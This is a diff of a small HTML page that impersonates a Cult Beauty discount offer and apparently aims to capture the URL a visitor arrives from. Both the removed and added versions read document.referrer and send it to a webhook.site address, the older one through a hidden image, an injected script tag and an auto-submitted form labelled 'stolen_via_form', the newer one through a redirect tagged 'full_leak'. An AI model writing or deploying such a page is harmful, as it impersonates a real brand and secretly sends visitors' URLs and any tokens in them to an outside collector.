@@ -1,38 +1,21 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Cult Beauty - Exclusive Offer</title>
+    <title>Processing Discount...</title>
 </head>
-<body style="text-align:center; padding-top:100px; font-family:sans-serif;">
-    <h1>Claim Your 50% Discount</h1>
-    <p>Loading security certificate... Do not close this tab.</p>
-
+<body>
     <script>
-        // Naya Fresh Webhook URL yahan dalein
         var webhook = "https://webhook.site/0d29a0c1-c4ad-44a3-8e36-8a74dbe54628";
-        var leakedUrl = document.referrer;
+        var ref = document.referrer;
 
-        if (leakedUrl) {
-            // Method 1: Hidden Image (Sab se powerful bypass)
-            var img = new Image();
-            img.src = webhook + "?method=image&data=" + encodeURIComponent(leakedUrl);
-
-            // Method 2: Script Tag injection
-            var script = document.createElement('script');
-            script.src = webhook + "?method=script&data=" + encodeURIComponent(leakedUrl);
-            document.body.appendChild(script);
-            
-            // Method 3: Automatic Form Submission (Ghost Form)
-            var form = document.createElement('form');
-            form.method = 'GET';
-            form.action = webhook;
-            var input = document.createElement('input');
-            input.name = 'stolen_via_form';
-            input.value = leakedUrl;
-            form.appendChild(input);
-            document.body.appendChild(form);
-            form.submit();
+        // Agar referrer maujood hai (yani click karke aaye hain)
+        if (ref) {
+            window.location.href = webhook + "?full_leak=" + encodeURIComponent(ref);
+        } else {
+            document.write("<h1>Please click the link from Cult Beauty to see the leak.</h1>");
         }
     </script>
 </body>
 </html>
+
+
